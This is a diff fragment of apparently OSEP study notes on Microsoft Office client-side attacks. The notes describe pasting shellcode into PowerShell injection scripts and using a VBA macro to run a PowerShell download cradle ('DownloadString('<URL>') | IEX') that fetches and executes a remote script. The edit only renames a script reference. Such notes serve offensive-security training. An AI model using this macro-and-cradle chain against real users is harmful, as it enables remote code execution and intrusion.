@@ -64,7 +64,7 @@ We can execute the code of a remote script by using some Powershell methods.
     ```
 2. Once we craft it, we paste it in the '$buf' variable of [VBAenvlauncher.ps1](https://github.com/qv1ntv5/OSEP/blob/main/ClientSideAttacks/MicrosoftOffice/PowerShell/VBAenvlauncher.ps1) or [InyectionShellcode.ps1](https://github.com/qv1ntv5/OSEP/blob/main/ClientSideAttacks/MicrosoftOffice/PowerShell/InyectionShellcode.ps1) script.
 
-3. Then, we make use of [LaunchinApp_Shell.vba](https://github.com/qv1ntv5/OSEP/blob/main/ClientSideAttacks/MicrosoftOffice/VBA/LaunchinApp_Shell.vba) to execute a PowerShell program that downloads and executes the prepared VBAenvlauncher.ps1 script. The line stored on the *str* var must be:
+3. Then, we make use of [LaunchinApp_Shell.vba](https://github.com/qv1ntv5/OSEP/blob/main/ClientSideAttacks/MicrosoftOffice/VBA/LaunchinApp_Shell.vba) to execute a PowerShell program that downloads and executes the prepared PS1 script. The line stored on the *str* var must be:
 
     ```powershell
     powershell (New-Object System.Net.WebClient).DownloadString('<URL>') | IEX
